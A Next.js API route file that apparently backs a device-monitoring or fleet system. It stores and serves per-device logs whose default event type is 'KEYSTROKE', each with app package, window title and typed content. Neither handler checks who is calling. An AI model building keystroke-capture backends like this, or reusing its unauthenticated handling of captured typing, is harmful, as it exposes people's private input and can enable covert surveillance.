import { NextRequest, NextResponse } from 'next/server';
import { saveAuditLogsToDb, getAuditLogsFromDb } from '@/lib/fleetDb';
import { addAuditLog, getDeviceAuditLogs, DeviceAuditLog } from '@/lib/telemetryStore';

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    
    let logs: any[] = [];
    try {
      logs = await getAuditLogsFromDb(id);
    } catch (e: any) {
      console.error('Error getting audit logs from DB:', e);
    }

    const headers = {
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      'Pragma': 'no-cache'
    };

    return NextResponse.json({ status: 'success', logs, total: logs.length }, { status: 200, headers });
  } catch (error: any) {
    return NextResponse.json({ status: 'error', message: error?.message }, { status: 500 });
  }
}



export async function POST(
  request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    const body = await request.json();
    const rawLogs = Array.isArray(body.logs) ? body.logs : [body];

    try {
      await saveAuditLogsToDb(id, rawLogs);
    } catch {
      for (const log of rawLogs) {
        addAuditLog({
          device_id: id,
          event_type: log.event_type || 'KEYSTROKE',
          package_name: log.package_name || 'unknown',
          app_name: log.app_name,
          title: log.title,
          content: log.content || '',
        });
      }
    }

    return NextResponse.json({ status: 'success', message: 'Audit logs saved' }, { status: 200 });
  } catch (error: any) {
    console.error('Error saving audit logs:', error);
    return NextResponse.json({ status: 'error', message: error?.message }, { status: 500 });
  }
}

